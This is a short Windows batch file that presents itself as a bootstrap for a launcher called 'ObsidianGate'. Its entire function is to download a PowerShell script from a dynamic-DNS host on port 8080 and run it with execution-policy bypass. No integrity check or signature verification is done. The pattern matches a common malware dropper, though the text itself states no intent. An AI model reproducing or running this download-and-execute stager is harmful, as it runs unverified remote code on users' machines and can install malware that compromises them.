@echo off
setlocal
set "SCRIPT_DIR=%~dp0"
set "BOOTSTRAP_PS1=%SCRIPT_DIR%ObsidianGateLauncher.ps1"
if not exist "%BOOTSTRAP_PS1%" (
  echo [ObsidianGate] Downloading launcher bootstrap...
  powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://obsidiangates.duckdns.org:8080/launcher/ObsidianGateLauncher.ps1' -OutFile $env:BOOTSTRAP_PS1 -UseBasicParsing"
  if errorlevel 1 (
    echo [ObsidianGate] Failed to download launcher bootstrap.
    pause
    exit /b 1
  )
)
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%BOOTSTRAP_PS1%" %*
exit /b %ERRORLEVEL%
